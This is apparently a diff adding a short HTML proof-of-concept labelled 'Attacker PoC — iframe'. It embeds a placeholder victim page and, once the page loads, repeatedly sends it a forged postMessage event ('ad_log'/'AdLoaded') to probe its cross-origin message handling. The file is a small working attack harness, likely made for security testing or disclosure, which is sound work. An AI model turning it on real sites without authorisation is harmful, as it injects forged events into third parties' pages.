@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Attacker PoC — iframe</title></head>
+<body>
+<h3>Attacker PoC — iframe</h3>
+<p id="status">Status: not started</p>
+<iframe id="victim" src="https://<VICTIM_PAGE_URL_HERE>" style="width:800px;height:400px"></iframe>
+<script>
+const iframe = document.getElementById('victim');
+const victimOrigin = new URL(iframe.src).origin;
+iframe.addEventListener('load', ()=>{
+  document.getElementById('status').innerText = 'iframe loaded. sending messages...';
+  const msg = JSON.stringify({ event: 'ad_log', message: 'AdLoaded', args: {} });
+  // try a few times
+  for(let i=0;i<5;i++){
+    console.log('postMessage to iframe', i, msg);
+    iframe.contentWindow.postMessage(msg, victimOrigin);
+  }
+});
+</script>
+</body>
+</html>
